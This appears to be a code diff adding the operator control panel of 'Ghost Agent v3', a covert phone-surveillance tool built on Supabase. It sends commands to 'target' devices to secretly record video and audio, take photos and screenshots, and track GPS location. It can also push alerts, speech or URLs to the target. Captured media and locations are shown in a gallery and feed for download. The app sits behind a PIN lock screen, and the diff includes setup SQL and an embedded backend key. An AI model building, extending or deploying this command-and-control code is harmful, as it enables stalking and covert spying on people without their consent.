+      <button class="live-btn stop"   onclick="sendCmd('video_stop')"><span class="lbi">⏹</span><span class="lbn">Stop</span><span class="lbl">HALT REC</span></button>
+      <button class="live-btn snap"   onclick="refreshVideoFeed()"><span class="lbi">🔄</span><span class="lbn">Refresh Feed</span><span class="lbl">CHECK RESULTS</span></button>
+    </div>
+
+    <!-- Status bar -->
+    <div id="vidStatusBar" style="background:rgba(0,229,160,.05);border:1px solid var(--border);border-radius:10px;padding:11px 14px;font-size:11px;color:var(--muted);margin-bottom:12px;min-height:42px">
+      📹 Select duration → tap Rear or Front Camera to record on target device.
+    </div>
+
+    <!-- Video list -->
+    <div style="font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:8px">RECORDED VIDEOS</div>
+    <div id="vidList" style="display:flex;flex-direction:column;gap:8px">
+      <div style="text-align:center;padding:28px 16px;color:var(--muted);font-size:12px;border:1px dashed var(--border);border-radius:12px">No videos yet. Send a record command.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ DEVICES ══ -->
+<div class="panel" id="panel-devices">
+  <div class="setup-card">
+    <strong>⚙ Supabase Setup — Full SQL (v3 with Live Stream)</strong><br>
+    Run once in your Supabase SQL Editor.
+    <div class="sql-block"><pre id="sqlText">-- Ghost Agent v3 — run once in Supabase SQL Editor
+
+create table if not exists ghost_devices (
+  device_id   text primary key,
+  info        text,
+  battery     text,
+  last_seen   timestamptz default now(),
+  online      boolean default false,
+  live_active boolean default false
+);
+
+create table if not exists ghost_commands (
+  id         bigserial primary key,
+  device_id  text not null,
+  command    text not null,
+  param      text default '',
+  executed   boolean default false,
+  created_at timestamptz default now()
+);
+
+create table if not exists ghost_results (
+  id         bigserial primary key,
+  device_id  text not null,
+  type       text not null,
+  payload    text,
+  created_at timestamptz default now()
+);
+
+create table if not exists ghost_live_frames (
+  device_id  text primary key,
+  facing     text default 'environment',
+  frame      text,
+  seq        bigint default 0,
+  w          integer,
+  h          integer,
+  ts         timestamptz default now()
+);
+
+alter table ghost_devices     enable row level security;
+alter table ghost_commands    enable row level security;
+alter table ghost_results     enable row level security;
+alter table ghost_live_frames enable row level security;
+
+create policy "anon all" on ghost_devices     for all using (true) with check (true);
+create policy "anon all" on ghost_commands    for all using (true) with check (true);
+create policy "anon all" on ghost_results     for all using (true) with check (true);
+create policy "anon all" on ghost_live_frames for all using (true) with check (true);</pre></div>
+    <button class="copy-sql-btn" onclick="copySql()">📋 Copy SQL</button>
+  </div>
+  <div class="stats-row">
+    <div class="stat-card"><div class="stat-val" id="statOnline">0</div><div class="stat-lbl">ONLINE NOW</div></div>
+    <div class="stat-card"><div class="stat-val" id="statTotal">0</div><div class="stat-lbl">TOTAL SEEN</div></div>
+  </div>
+  <div class="sec-label gap">📡 Devices</div>
+  <div id="deviceList"><div class="no-devs">Scanning for devices…</div></div>
+</div>
+
+<!-- ══ GALLERY ══ -->
+<div class="panel" id="panel-gallery">
+  <div class="gallery-tools">
+    <select class="gallery-sel" id="galFilter" onchange="renderGallery()">
+      <option value="all">All Photos</option>
+      <option value="capture">Rear Camera</option>
+      <option value="selfie">Selfie</option>
+      <option value="screenshot">Screenshots</option>
+    </select>
+    <button class="gallery-ref" onclick="loadGallery()">↻</button>
+  </div>
+  <div class="gallery-cnt" id="galCnt"></div>
+  <div id="galGrid" class="gallery-grid"></div>
+  <div id="galEmpty" class="gallery-empty" style="display:none">📷 No photos yet.<br>Send a Capture or Selfie command.</div>
+</div>
+
+<!-- ══ FEED ══ -->
+<div class="panel" id="panel-feed">
+  <div class="feed-wrap">
+    <div class="feed-hdr"><span>📥 LIVE FEED</span><button class="clr-btn" onclick="clearFeed()">CLEAR</button></div>
+    <div class="feed-list" id="feedList"><div class="f-empty">No results yet. Send a command.</div></div>
+  </div>
+</div>
+
+<!-- LIGHTBOX -->
+<div id="lb">
+  <div class="lb-top">
+    <div class="lb-title" id="lbTitle">Photo</div>
+    <div class="lb-acts">
+      <button class="lb-btn dl" onclick="dlCurrentPhoto()">⬇ Save</button>
+      <button class="lb-btn cls" onclick="closeLb()">✕</button>
+    </div>
+  </div>
+  <img id="lbImg" src="" alt="">
+  <div class="lb-bot" id="lbMeta"></div>
+</div>
+
+</div><!-- end #app -->
+
+<script>
+// ─────────────────────────────────────────────
+//  PASSWORD LOCK  (default code: 2426 — change LOCK_CODE to customize)
+// ─────────────────────────────────────────────
+const LOCK_CODE = '2426';
+let lockBuffer  = '';
+
+function lockInput(digit) {
+  if (lockBuffer.length >= LOCK_CODE.length) return;
+  lockBuffer += digit;
+  updateLockDots();
+  if (lockBuffer.length === LOCK_CODE.length) {
+    if (lockBuffer === LOCK_CODE) {
+      for (let i = 0; i < 4; i++) {
+        document.getElementById('ld' + i).classList.add('filled');
+      }
+      setTimeout(() => {
+        document.getElementById('lockScreen').classList.add('unlocked');
+        document.getElementById('app').style.display = 'block';
+        bootstrap();
+      }, 300);
+    } else {
+      document.getElementById('lockErr').textContent = 'WRONG CODE';
+      document.querySelectorAll('.lock-dot').forEach(d => {
+        d.classList.remove('filled'); d.classList.add('error');
+      });
+      setTimeout(() => {
+        document.querySelectorAll('.lock-dot').forEach(d => d.classList.remove('error'));
+        document.getElementById('lockErr').textContent = '\u00a0';
+        lockBuffer = '';
+        updateLockDots();
+      }, 700);
+    }
+  }
+}
+function lockBackspace() {
+  if (!lockBuffer.length) return;
+  lockBuffer = lockBuffer.slice(0, -1);
+  updateLockDots();
+}
+function updateLockDots() {
+  for (let i = 0; i < 4; i++) {
+    document.getElementById('ld' + i).classList.toggle('filled', i < lockBuffer.length);
+  }
+}
+
+// ─────────────────────────────────────────────
+//  CONFIG
+// ─────────────────────────────────────────────
+const SUPABASE_URL = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+const HDR = {
+  'apikey':        SUPABASE_KEY,
+  'Authorization': 'Bearer ' + SUPABASE_KEY,
+  'Content-Type':  'application/json'
+};
+
+// ─────────────────────────────────────────────
+//  APP STATE
+// ─────────────────────────────────────────────
+let selectedDeviceId  = '';
+let targetMode        = 'all';
+let allPhotos         = [];
+let curLbPhoto        = null;
+let lastResultId      = 0;
+let newPhotoCnt       = 0;
+window._feedPhotos    = {};
+window._knownDevices  = [];
+
+// Video recording state (see video section)
+
+// ─────────────────────────────────────────────
+//  SUPABASE HELPERS
+// ─────────────────────────────────────────────
+async function dbInsert(table, row) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+      method: 'POST',
+      headers: { ...HDR, 'Prefer': 'return=minimal' },
+      body: JSON.stringify(row)
+    });
+    if (!r.ok) {
+      const txt = await r.text().catch(() => '');
+      console.warn(`dbInsert ${table} ${r.status}:`, txt);
+    }
+    return r.ok;
+  } catch(e) { console.warn('dbInsert error:', e); return false; }
+}
+
+async function dbSelect(table, qs) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}?${qs}`, { headers: HDR });
+    if (!r.ok) {
+      const txt = await r.text().catch(() => '');
+      console.warn(`dbSelect ${table} ${r.status}:`, txt);
+      return [];
+    }
+    return await r.json();
+  } catch(e) { return []; }
+}
+
+// ─────────────────────────────────────────────
+//  SQL COPY
+// ─────────────────────────────────────────────
+function copySql() {
+  const sql = document.getElementById('sqlText').textContent;
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(sql)
+      .then(() => showToast('📋 SQL copied!'))
+      .catch(fallback);
+  } else { fallback(); }
+  function fallback() {
+    const ta = document.createElement('textarea');
+    ta.value = sql; ta.style.cssText = 'position:fixed;opacity:0';
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
+    showToast('📋 SQL copied!');
+  }
+}
+
+// ─────────────────────────────────────────────
+//  TABS
+// ─────────────────────────────────────────────
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  const tabEl   = document.getElementById('tab-' + name);
+  const panelEl = document.getElementById('panel-' + name);
+  if (!tabEl || !panelEl) return;
+  tabEl.classList.add('active');
+  panelEl.classList.add('active');
+  if (name === 'gallery') {
+    newPhotoCnt = 0;
+    const b = tabEl.querySelector('.badge');
+    if (b) b.remove();
+    loadGallery();
+  }
+  if (name === 'devices') pollDevices();
+  if (name === 'video') {
+    refreshVideoFeed();
+  }
+  if (name === 'feed') {
+    const b2 = tabEl.querySelector('.badge');
+    if (b2) b2.remove();
+  }
+}
+
+// ─────────────────────────────────────────────
+//  TARGET
+// ─────────────────────────────────────────────
+function setTarget(mode) {
+  targetMode = mode;
+  document.getElementById('chipAll').classList.toggle('active', mode === 'all');
+  document.getElementById('chipOne').classList.toggle('active', mode === 'one');
+}
+
+function selectDevice(id) {
+  selectedDeviceId = id;
+  const short = id.replace('device_', '').slice(0, 14);
+  document.getElementById('chipOneLabel').textContent = short + '…';
+  setTarget('one');
+  document.querySelectorAll('.dev-card').forEach(c =>
+    c.classList.toggle('selected', c.dataset.id === id));
+  document.querySelectorAll('.dev-mini').forEach(m =>
+    m.classList.toggle('selected', m.dataset.id === id));
+  // Auto-refresh video feed when device selected
+  // (no live viewer anymore — using video recording)
+  showToast('🎯 Target: ' + short);
+}
+
+// ─────────────────────────────────────────────
+//  SEND COMMAND
+// ─────────────────────────────────────────────
+async function sendCmd(command, param) {
+  param = (param !== undefined && param !== null) ? String(param) : '';
+  let targetId;
+  if (targetMode === 'all') {
+    targetId = 'all';
+  } else {
+    if (!selectedDeviceId) { showToast('⚠ Select a device first'); return; }
+    targetId = selectedDeviceId;
+  }
+  const ok = await dbInsert('ghost_commands', {
+    device_id:  targetId,
+    command,
+    param,
+    executed:   false,
+    created_at: new Date().toISOString()
+  });
+  showToast(ok
+    ? '✅ ' + command.toUpperCase() + ' → ' + (targetId === 'all' ? 'ALL' : targetId.replace('device_','').slice(0,12))
+    : '❌ Send failed — check Supabase');
+}
+
+function sendVideoCmd(facing) {
+  const cmd = facing === 'user' ? 'video_front' : 'video';
+  sendCmd(cmd, String(selectedDuration || 10));
+  const bar = document.getElementById('vidStatusBar');
+  if (bar) bar.textContent = `⏺ Recording ${selectedDuration || 10}s ${facing === 'user' ? 'front' : 'rear'} camera… please wait.`;
+  const dot = document.getElementById('vidRecDot');
+  if (dot) dot.style.display = 'block';
+  setTimeout(() => { switchTab('video'); }, 300);
+  setTimeout(() => refreshVideoFeed(), ((selectedDuration || 10) + 5) * 1000);
+}
+
+function sendCustom() {
+  const v = (document.getElementById('customIn').value || '').trim();
+  if (!v) return;
+  const parts = v.split(' ');
+  sendCmd(parts[0], parts.slice(1).join(' '));
+  document.getElementById('customIn').value = '';
+}
+
+function promptAlert()    { const m = prompt('Message to show on target:'); if (m && m.trim()) sendCmd('alert',    m.trim()); }
+function promptSpeak()    { const m = prompt('Text to speak on target:');   if (m && m.trim()) sendCmd('speak',    m.trim()); }
+function promptRedirect() { const u = prompt('URL to open on target:');     if (u && u.trim()) sendCmd('redirect', u.trim()); }
+
+// ─────────────────────────────────────────────
+//  VIDEO RECORDING PANEL
+// ─────────────────────────────────────────────
+let selectedDuration = 5;
+let lastVideoResultId = 0;
+let vidPollInterval = null;
+
+function setDur(s) {
+  selectedDuration = s;
+  [5,10,20,30,60].forEach(d => {
+    const b = document.getElementById('dur' + d);
+    if (b) b.classList.toggle('active', d === s);
+  });
+}
+
+function sendVideoCmd(facing) {
+  const cmd = facing === 'user' ? 'video_front' : 'video';
+  sendCmd(cmd, String(selectedDuration));
+  const bar = document.getElementById('vidStatusBar');
+  if (bar) bar.textContent = `⏺ Recording ${selectedDuration}s ${facing === 'user' ? 'front' : 'rear'} camera… please wait.`;
+  const dot = document.getElementById('vidRecDot');
+  if (dot) dot.style.display = 'block';
+  // poll for result after recording finishes
+  setTimeout(() => refreshVideoFeed(), (selectedDuration + 4) * 1000);
+}
+
+async function refreshVideoFeed() {
+  const bar  = document.getElementById('vidStatusBar');
+  const list = document.getElementById('vidList');
+  if (bar) bar.textContent = '🔄 Checking for new videos…';
+  const rows = await dbSelect('ghost_results', 'type=eq.video&order=id.desc&limit=20');
+  const dot = document.getElementById('vidRecDot');
+  if (dot) dot.style.display = 'none';
+  if (!rows || !rows.length) {
+    if (bar) bar.textContent = '📭 No videos yet. Send a record command.';
+    return;
+  }
+  if (bar) bar.textContent = `✅ ${rows.length} video(s) found — scroll down to view & download.`;
+  list.innerHTML = '';
+  for (const row of rows) {
+    try {
+      const p = JSON.parse(row.payload);
+      const card = document.createElement('div');
+      card.className = 'vid-card';
+      const time = new Date(row.created_at).toLocaleString();
+      const devShort = (row.device_id || '').replace('device_', '').slice(0, 12);
+      if (p.error) {
+        card.innerHTML = `
+          <div class="vid-meta">❌ Error: ${p.error}</div>
+          <div class="vid-meta">${time} · ${devShort}</div>`;
+      } else if (p.video && p.video.startsWith('data:')) {
+        card.innerHTML = `
+          <div class="vid-meta">📹 ${p.facing === 'user' ? 'Front' : 'Rear'} · ${p.seconds}s · ${p.size_kb || '?'} KB · ${p.mime || 'webm'}</div>
+          <video controls playsinline src="${p.video}"></video>
+          <div class="vid-meta">${time} · ${devShort}</div>
+          <button class="vid-dl" onclick="dlVideo('${row.id}')">⬇ Download</button>`;
+        // Store for download
+        window._vidData = window._vidData || {};
+        window._vidData[row.id] = { src: p.video, mime: p.mime, time: row.created_at };
+      } else {
+        card.innerHTML = `<div class="vid-meta">⚠ Video data missing or still uploading…</div>`;
+      }
+      list.appendChild(card);
+    } catch(e) { /* skip malformed */ }
+  }
+}
+
+function dlVideo(id) {
+  const d = (window._vidData || {})[id];
+  if (!d) { showToast('⚠ Video not loaded'); return; }
+  const ext = (d.mime || 'video/webm').includes('mp4') ? 'mp4' : 'webm';
+  const a = document.createElement('a');
+  a.href = d.src;
+  a.download = 'ghost_video_' + id + '.' + ext;
+  a.click();
+  showToast('📥 Download started!');
+}
+
+// ─────────────────────────────────────────────
+//  GALLERY
+// ─────────────────────────────────────────────
+async function loadGallery() {
+  const cntEl = document.getElementById('galCnt');
+  if (cntEl) cntEl.textContent = 'Loading…';
+  // PostgREST in() filter — correct syntax: type=in.(val1,val2,val3)
+  const rows = await dbSelect('ghost_results',
+    'type=in.(capture,selfie,screenshot)&order=created_at.desc&limit=200');
+  allPhotos = (rows || []).filter(r => {
+    try { return !!JSON.parse(r.payload).image; } catch(e) { return false; }
+  });
+  renderGallery();
+}
+
+function renderGallery() {
+  const filter = document.getElementById('galFilter');
+  const grid   = document.getElementById('galGrid');
+  const empty  = document.getElementById('galEmpty');
+  const cntEl  = document.getElementById('galCnt');
+  if (!filter || !grid || !empty || !cntEl) return;
+  const photos = filter.value === 'all'
+    ? allPhotos
+    : allPhotos.filter(p => p.type === filter.value);
+  grid.innerHTML = '';
+  if (!photos.length) {
+    grid.style.display  = 'none';
+    empty.style.display = 'block';
+    cntEl.textContent   = '0 photos';
+    return;
+  }
+  grid.style.display  = 'grid';
+  empty.style.display = 'none';
+  cntEl.textContent   = photos.length + ' photo' + (photos.length !== 1 ? 's' : '');
+  photos.forEach(row => {
+    let p = {}; try { p = JSON.parse(row.payload); } catch(e) {}
+    const lbl  = row.type === 'selfie' ? '🤳 SELFIE' : row.type === 'screenshot' ? '🖥 SCREEN' : '📷 REAR';
+    const time = new Date(row.created_at).toLocaleString([], { month:'short', day:'numeric', hour:'2-digit', minute:'2-digit' });
+    const dev  = (row.device_id || '').replace('device_', '').slice(0, 10);
+    const item = document.createElement('div');
+    item.className = 'g-item';
+    item.onclick   = () => openLb(row, p);
+    item.innerHTML = '<img src="' + p.image + '" alt="capture" loading="lazy">'
+      + '<div class="g-item-info"><div class="g-type">' + lbl + '</div>'
+      + '<div class="g-time">' + time + '</div>'
+      + '<div class="g-dev">' + dev + '</div></div>';
+    grid.appendChild(item);
+  });
+}
+
+// ─────────────────────────────────────────────
+//  LIGHTBOX
+// ─────────────────────────────────────────────
+function openLb(row, payload) {
+  curLbPhoto = { row, payload };
+  document.getElementById('lbImg').src = payload.image;
+  const lbl = row.type === 'selfie' ? '🤳 Selfie' : row.type === 'screenshot' ? '🖥 Screenshot' : '📷 Rear Camera';
+  document.getElementById('lbTitle').textContent = lbl;
+  document.getElementById('lbMeta').textContent  =
+    new Date(row.created_at).toLocaleString() + ' · ' + row.device_id
+    + (payload.w ? ' · ' + payload.w + '×' + payload.h : '')
+    + (payload.burst ? ' · Shot ' + payload.shot + '/' + payload.total : '');
+  document.getElementById('lb').classList.add('open');
+}
+function closeLb() {
+  document.getElementById('lb').classList.remove('open');
+  curLbPhoto = null;
+}
+function dlCurrentPhoto() {
+  if (!curLbPhoto) return;
+  const a = document.createElement('a');
+  a.href     = curLbPhoto.payload.image;
+  a.download = 'ghost_' + curLbPhoto.row.type + '_' + Date.now() + '.jpg';
+  a.click();
+  showToast('📥 Saving…');
+}
+document.getElementById('lb').addEventListener('click', e => {
+  if (e.target === document.getElementById('lb')) closeLb();
+});
+
+function openLbById(id) {
+  const d = window._feedPhotos[id];
+  if (d) openLb(d.row, d.payload);
+}
+function dlPhotoById(id) {
+  const d = window._feedPhotos[id]; if (!d) return;
+  const a = document.createElement('a');
+  a.href = d.payload.image; a.download = 'ghost_' + d.row.type + '_' + Date.now() + '.jpg'; a.click();
+  showToast('📥 Saving…');
+}
+
+// ─────────────────────────────────────────────
+//  FEED
+// ─────────────────────────────────────────────
+function renderFeedItem(row) {
+  let p = {}; try { p = JSON.parse(row.payload); } catch(e) {}
+  const list = document.getElementById('feedList');
+  if (!list) return;
+  const empty = list.querySelector('.f-empty'); if (empty) empty.remove();
+  const isPhoto = ['capture', 'selfie', 'screenshot'].includes(row.type);
+  const isLive  = row.type === 'live_status';
+  const badgeCls = isPhoto ? 'photo'
+    : row.type === 'location' ? 'location'
+    : row.type === 'audio'    ? 'audio'
+    : isLive                  ? 'live' : '';
+
+  let bodyHtml = '';
+  if (isPhoto && p.image) {
+    const pid = 'photo_' + row.id;
+    window._feedPhotos[pid] = { row, payload: p };
+    bodyHtml = '<img class="f-img" src="' + p.image + '" alt="capture" onclick="openLbById(\'' + pid + '\')">'
+      + (p.facing ? '<div style="font-size:10px;color:#555;margin-top:4px">Cam: ' + p.facing
+          + (p.w ? ' · ' + p.w + '×' + p.h : '')
+          + (p.burst ? ' · Burst ' + p.shot + '/' + p.total : '') + '</div>' : '')
+      + '<button class="save-btn" onclick="dlPhotoById(\'' + pid + '\')">⬇ Save</button>';
+  } else if (row.type === 'audio' && p.audio) {
+    bodyHtml = '<audio class="f-audio" controls src="' + p.audio + '"></audio>'
+      + '<div style="font-size:9px;color:#555;margin-top:4px">Duration: ' + p.duration + 's · ' + (p.mime || 'audio/webm') + '</div>';
+  } else if (row.type === 'location' && p.lat !== undefined) {
+    bodyHtml = '<div>📍 ' + p.lat.toFixed(6) + ', ' + p.lng.toFixed(6) + '</div>'
+      + '<div style="font-size:10px;color:#666">±' + Math.round(p.accuracy || 0) + 'm · Speed: '
+      + (p.speed != null ? p.speed + 'm/s' : 'N/A') + '</div>'
+      + '<a class="loc-link" href="' + p.maps + '" target="_blank" rel="noopener">Open Maps ↗</a>';
+  } else if (isLive) {
+    const icon = p.status === 'started' ? '🔴' : p.status === 'stopped' ? '⏹' : '⚠';
+    bodyHtml = '<div>' + icon + ' Stream <strong style="color:var(--red)">'
+      + (p.status || '').toUpperCase() + '</strong>'
+      + (p.facing ? ' · ' + (p.facing === 'user' ? 'Front' : 'Rear') : '') + '</div>';
+    if (p.status === 'started') {
+      const liveTabEl = document.getElementById('tab-video');
+      if (liveTabEl && !document.getElementById('panel-video') && document.getElementById('panel-video').classList.contains('active')) {
+        let lb2 = liveTabEl.querySelector('.live-badge');
+        if (!lb2) {
+          lb2 = document.createElement('span');
+          lb2.className = 'live-badge'; lb2.textContent = '●';
+          liveTabEl.appendChild(lb2);
+        }
+      }
+    }
+  } else if (p.error) {
+    bodyHtml = '<div style="color:var(--warn);font-size:11px">⚠ ' + p.error + '</div>';
+  } else {
+    bodyHtml = '<pre>' + JSON.stringify(p, null, 2) + '</pre>';
+  }
+
+  const devShort = (row.device_id || '').replace('device_', '').slice(0, 12);
+  const item = document.createElement('div');
+  item.className = 'f-item';
+  item.innerHTML =
+    '<div class="f-meta"><span class="f-badge ' + badgeCls + '">' + row.type.toUpperCase() + '</span>'
+    + '<span class="f-time">' + new Date(row.created_at).toLocaleTimeString() + '</span></div>'
+    + '<div class="f-dev">🖥 ' + devShort + '</div>'
+    + '<div class="f-body">' + bodyHtml + '</div>';
+  list.prepend(item);
+}
+
+function clearFeed() {
+  const list = document.getElementById('feedList');
+  if (list) list.innerHTML = '<div class="f-empty">Feed cleared.</div>';
+  window._feedPhotos = {};
+}
+
+// ─────────────────────────────────────────────
+//  DEVICES
+// ─────────────────────────────────────────────
+async function pollDevices() {
+  const devs = await dbSelect('ghost_devices', 'order=last_seen.desc&limit=30');
+  window._knownDevices = devs || [];
+
+  const list     = document.getElementById('deviceList');
+  const bar      = document.getElementById('devBar');
+  const onlineEl = document.getElementById('statOnline');
+  const totalEl  = document.getElementById('statTotal');
+
+  // Always update device bar (it's always visible)
+  if (bar) {
+    if (!devs || !devs.length) {
+      bar.innerHTML = '<div class="dev-mini-empty">No devices</div>';
+    } else {
+      bar.innerHTML = '';
+      devs.forEach(d => {
+        const age    = Math.floor((Date.now() - new Date(d.last_seen)) / 1000);
+        const online = age < 50;
+        const isLive = d.live_active === true;
+        const short  = (d.device_id || '').replace('device_', '');
+        const isSel  = d.device_id === selectedDeviceId;
+        const mini   = document.createElement('div');
+        let cls = 'dev-mini ' + (online ? 'online' : 'offline');
+        if (isSel)   cls += ' selected';
+        if (isLive)  cls += ' live-streaming';
+        mini.className  = cls;
+        mini.dataset.id = d.device_id;
+        mini.onclick    = () => selectDevice(d.device_id);
+        mini.innerHTML  = '<div class="dm-dot"></div>' + short.slice(0, 8) + (isLive ? '🔴' : '');
+        bar.appendChild(mini);
+      });
+    }
+  }
+
+  if (!list) { populateLiveDeviceSelect(); return; }
+
+  if (!devs || !devs.length) {
+    list.innerHTML = '<div class="no-devs">No devices registered yet.<br>Open the Target file on another phone.</div>';
+    if (onlineEl) onlineEl.textContent = '0';
+    if (totalEl)  totalEl.textContent  = '0';
+    populateLiveDeviceSelect();
+    return;
+  }
+
+  let onlineCnt = 0;
+  list.innerHTML = '';
+  devs.forEach(d => {
+    const age    = Math.floor((Date.now() - new Date(d.last_seen)) / 1000);
+    const online = age < 50;
+    const isLive = d.live_active === true;
+    if (online) onlineCnt++;
+    const timeStr = age < 60 ? age + 's ago'
+      : age < 3600 ? Math.floor(age / 60) + 'm ago'
+      : Math.floor(age / 3600) + 'h ago';
+    const short = (d.device_id || '').replace('device_', '');
+    const isSel = d.device_id === selectedDeviceId;
+
+    let batStr = '';
+    if (d.battery) {
+      try {
+        const b = JSON.parse(d.battery);
+        batStr = b.level ? '🔋 ' + b.level + (b.charging ? ' ⚡' : '') : '';
+      } catch(e) {}
+    }
+
+    let pillCls = 'dev-pill';
+    if (isLive)       pillCls += ' live-pill';
+    else if (!online) pillCls += ' offline';
+
+    let cardCls = 'dev-card';
+    if (online) cardCls += ' online';
+    if (isSel)  cardCls += ' selected';
+    if (isLive) cardCls += ' live-on';
+
+    const card = document.createElement('div');
+    card.className  = cardCls;
+    card.dataset.id = d.device_id;
+    card.onclick    = () => selectDevice(d.device_id);
+    card.innerHTML  =
+      '<span class="dev-icon">' + (isLive ? '📹' : online ? '📱' : '💀') + '</span>'
+      + '<div style="flex:1;min-width:0">'
+      +   '<div class="dev-id">' + short.slice(0, 16) + '</div>'
+      +   '<div class="dev-seen">Last: ' + timeStr + '</div>'
+      +   (batStr ? '<div class="dev-bat">' + batStr + '</div>' : '')
+      + '</div>'
+      + '<div class="' + pillCls + '">' + (isLive ? '🔴 LIVE' : online ? 'ONLINE' : 'OFFLINE') + '</div>';
+    list.appendChild(card);
+  });
+
+  if (onlineEl) onlineEl.textContent = onlineCnt;
+  if (totalEl)  totalEl.textContent  = devs.length;
+  populateLiveDeviceSelect();
+}
+
+// ─────────────────────────────────────────────
+//  RESULT POLLING
+// ─────────────────────────────────────────────
+async function pollResults() {
+  const rows = await dbSelect('ghost_results',
+    'id=gt.' + lastResultId + '&order=id.asc&limit=50');
+  if (!rows || !rows.length) return;
+  rows.forEach(r => {
+    renderFeedItem(r);
+    if (r.id > lastResultId) lastResultId = r.id;
+  });
+  const newPhotos = rows.filter(r => ['capture', 'selfie', 'screenshot'].includes(r.type));
+  if (newPhotos.length) {
+    newPhotoCnt += newPhotos.length;
+    const galTab = document.getElementById('tab-gallery');
+    if (galTab && !document.getElementById('panel-gallery').classList.contains('active')) {
+      let badgeEl = galTab.querySelector('.badge');
+      if (!badgeEl) {
+        badgeEl = document.createElement('span');
+        badgeEl.className = 'badge';
+        galTab.appendChild(badgeEl);
+      }
+      badgeEl.textContent = '+' + newPhotoCnt;
+    } else {
+      loadGallery();
+    }
+  }
+}
+
+// ─────────────────────────────────────────────
+//  CONNECTION CHECK
+// ─────────────────────────────────────────────
+async function checkConn() {
+  const dotEl = document.getElementById('liveDot');
+  const txtEl = document.getElementById('connTxt');
+  try {
+    const r = await fetch(SUPABASE_URL + '/rest/v1/ghost_devices?limit=1', { headers: HDR });
+    if (txtEl) txtEl.textContent = r.ok ? 'LIVE' : 'DB ERR';
+    if (dotEl) dotEl.classList.toggle('err', !r.ok);
+  } catch(e) {
+    if (txtEl) txtEl.textContent = 'OFFLINE';
+    if (dotEl) dotEl.classList.add('err');
+  }
+}
+
+// ─────────────────────────────────────────────
+//  TOAST
+// ─────────────────────────────────────────────
+function showToast(msg) {
+  document.querySelector('.toast')?.remove();
+  const t = document.createElement('div');
+  t.className = 'toast'; t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t?.remove(), 2800);
+}
+
+// ─────────────────────────────────────────────
+//  BOOTSTRAP — called only after unlock
+// ─────────────────────────────────────────────
+async function bootstrap() {
+  try {
+    const rows = await dbSelect('ghost_results', 'order=id.desc&limit=1');
+    if (rows && rows.length) lastResultId = rows[0].id;
+  } catch(e) {}
+  checkConn();
+  pollDevices();
+  // video panel loads on demand
+  setInterval(pollResults,  3000);
+  setInterval(pollDevices, 10000);
+  setInterval(checkConn,   30000);
+}
+</script>
+</body>
+</html>
